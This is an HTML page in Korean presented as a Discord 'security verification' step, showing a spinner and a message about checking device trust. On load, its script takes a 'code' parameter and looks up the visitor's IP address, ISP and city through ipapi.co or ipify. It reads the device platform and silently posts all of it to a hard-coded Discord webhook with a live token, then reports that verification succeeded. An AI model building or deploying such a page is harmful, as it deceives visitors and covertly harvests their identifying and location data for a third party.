<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { background: #0b0e14; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 40px; border-radius: 20px; border: 1px solid #30363d; text-align: center; width: 100%; max-width: 350px; }
        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top-color: #5865f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 10px; }
        p { color: #8b949e; font-size: 14px; }
    </style>
    <script>
        window.onload = async function() {
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');
            const webhook = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; //

            if (!code) return;

            // 1. 숫자 IP 및 통신사 정보 확실히 수집
            let ipData = { ip: "수집 실패", isp: "알 수 없음", loc: "대한민국" };
            try {
                // HTTPS를 지원하며 숫자 IP를 우선적으로 반환하는 API 사용
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                ipData = {
                    ip: d.ip, // 180.83.74.92 형태
                    isp: d.org || "알 수 없음", // LG POWERCOMM 등
                    loc: d.city || d.region || "대한민국"
                };
            } catch (e) {
                // 예비 API (ipify)
                try {
                    const res2 = await fetch('https://api.ipify.org?format=json');
                    const d2 = await res2.json();
                    ipData.ip = d2.ip;
                } catch(e2) {}
            }

            // 2. 웹훅 전송 레이아웃 (이미지와 동일한 구성)
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공 (Detailed Log)",
                    "color": 3066993,
                    "fields": [
                        { "name": "👤 인증 코드", "value": code, "inline": false },
                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
                        { "name": "📶 통신사 정보", "value": ipData.ip === "수집 실패" ? "알수없음" : ipData.isp, "inline": true },
                        { "name": "💻 운영체제", "value": navigator.platform.includes("Linux arm") ? "Android" : navigator.platform, "inline": true },
                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 12).toUpperCase(), "inline": false },
                        { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
                    ],
                    "footer": { "text": "Hardware ID: " + Math.random().toString(36).substring(2,10).toUpperCase() },
                    "timestamp": new Date().toISOString()
                }]
            };

            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            // 결과 화면 표시
            document.getElementById('loading').innerHTML = `
                <div style="font-size:40px; color:#23a559; margin-bottom:20px;">✔</div>
                <h1>인증 완료</h1>
                <p>보안 확인이 끝났습니다.<br>디스코드로 돌아가서 확인하세요.</p>
            `;
        }
    </script>
</head>
<body>
    <div class="card" id="loading">
        <div class="spinner"></div>
        <h1>보안 모듈 분석 중</h1>
        <p>기기 신뢰도 및 IP 주소를 확인하고 있습니다.</p>
    </div>
</body>
</html>
